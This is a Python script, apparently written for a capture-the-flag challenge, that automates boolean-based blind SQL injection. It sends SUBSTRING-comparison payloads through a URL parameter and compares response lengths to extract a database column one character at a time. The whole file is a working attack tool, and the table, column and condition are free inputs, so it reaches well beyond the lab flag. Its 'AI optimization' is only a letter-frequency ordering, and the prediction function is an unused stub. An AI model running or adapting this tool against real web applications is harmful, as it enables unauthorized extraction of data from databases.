#!/usr/bin/env python3
"""
AI-Optimized Blind SQL Injection Tool
For Challenge 9: Blind SQL Injection & Data Exfiltration

Uses AI to optimize character guessing in blind SQLi attacks
based on frequency analysis and context prediction.
"""

import argparse
import requests
import time
import sys


class BlindSQLiOptimizer:
    def __init__(self, target_url, param_name, ai_enabled=True):
        """Initialize blind SQLi optimizer"""
        self.target_url = target_url
        self.param_name = param_name
        self.ai_enabled = ai_enabled

        # English letter frequency (for AI optimization)
        self.char_frequency = "etaoinshrdlcumwfgypbvkjxqz"
        self.char_frequency += self.char_frequency.upper()
        self.char_frequency += "0123456789_{}"

    def test_injection(self, payload):
        """Test a SQL injection payload"""
        try:
            params = {self.param_name: payload}
            response = requests.get(self.target_url, params=params, timeout=5)
            return response
        except Exception as e:
            print(f"[!] Error: {e}")
            return None

    def check_true_condition(self, test_payload):
        """Check if condition returns true"""
        # Baseline: known true condition
        true_payload = "1"
        true_response = self.test_injection(true_payload)

        # Test payload
        test_response = self.test_injection(test_payload)

        if not true_response or not test_response:
            return False

        # Compare response lengths (simple boolean detection)
        return len(test_response.text) == len(true_response.text)

    def extract_data_blind(self, table, column, where_clause="1=1"):
        """Extract data using blind SQL injection with AI optimization"""

        print(f"[*] Extracting {column} from {table} where {where_clause}")
        print(f"[*] AI Optimization: {'Enabled' if self.ai_enabled else 'Disabled'}")
        print()

        extracted = ""
        position = 1

        while True:
            found_char = None

            # AI-optimized character order
            char_order = self.char_frequency if self.ai_enabled else "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"

            for char in char_order:
                # Build SQL injection payload for boolean-based blind SQLi
                # Payload: 1 AND SUBSTRING((SELECT column FROM table WHERE clause),position,1)='char'
                injection = f"1 AND SUBSTRING((SELECT {column} FROM {table} WHERE {where_clause} LIMIT 1),{position},1)='{char}'"

                print(f"\r[*] Position {position}: Testing '{char}'...", end='', flush=True)

                if self.check_true_condition(injection):
                    found_char = char
                    extracted += char
                    print(f"\r[+] Position {position}: Found '{char}' -> Current: {extracted}                   ")
                    break

                time.sleep(0.1)  # Rate limiting

            if not found_char:
                # No more characters found
                print(f"\n[+] Extraction complete: {extracted}")
                break

            position += 1

            # Stop if we've found closing brace (end of flag)
            if extracted.endswith('}'):
                print(f"[+] Flag detected: {extracted}")
                break

        return extracted

    def ai_predict_next_char(self, current_string):
        """
        Use AI to predict most likely next character
        (Placeholder - would use OpenAI API in production)
        """
        if not current_string:
            return 'F'  # Flags usually start with F

        # Simple heuristics (in real implementation, use AI API)
        if current_string == 'F':
            return 'L'
        if current_string == 'FL':
            return 'A'
        if current_string == 'FLA':
            return 'G'
        if current_string == 'FLAG':
            return '{'

        # Default frequency order
        return self.char_frequency[0]


def main():
    parser = argparse.ArgumentParser(
        description="AI-Optimized Blind SQL Injection Tool",
        epilog="Example: python blind_sqli_optimizer.py --target http://localhost:8080/index.php?page=product_detail --param id"
    )

    parser.add_argument('--target', required=True, help='Target URL')
    parser.add_argument('--param', required=True, help='Injectable parameter name')
    parser.add_argument('--table', default='products', help='Table name (default: products)')
    parser.add_argument('--column', default='hidden_flag', help='Column to extract (default: hidden_flag)')
    parser.add_argument('--where', default='id=1', help='WHERE clause (default: id=1)')
    parser.add_argument('--no-ai', action='store_true', help='Disable AI optimization')

    args = parser.parse_args()

    print("=" * 70)
    print("AI-Optimized Blind SQL Injection Tool")
    print("For Challenge 9: Blind SQL Injection & Data Exfiltration")
    print("=" * 70)
    print()

    optimizer = BlindSQLiOptimizer(
        target_url=args.target,
        param_name=args.param,
        ai_enabled=not args.no_ai
    )

    print(f"[*] Target: {args.target}")
    print(f"[*] Parameter: {args.param}")
    print(f"[*] Extracting: {args.table}.{args.column} WHERE {args.where}")
    print()

    try:
        result = optimizer.extract_data_blind(
            table=args.table,
            column=args.column,
            where_clause=args.where
        )

        print()
        print("=" * 70)
        print(f"[SUCCESS] Extracted data: {result}")
        print("=" * 70)
        print()
        print("Next steps:")
        print("1. Submit the extracted flag to the CTF platform")
        print("2. Compare execution time with/without AI optimization")
        print("3. Try extracting other columns for practice")

    except KeyboardInterrupt:
        print("\n[!] Extraction interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error during extraction: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
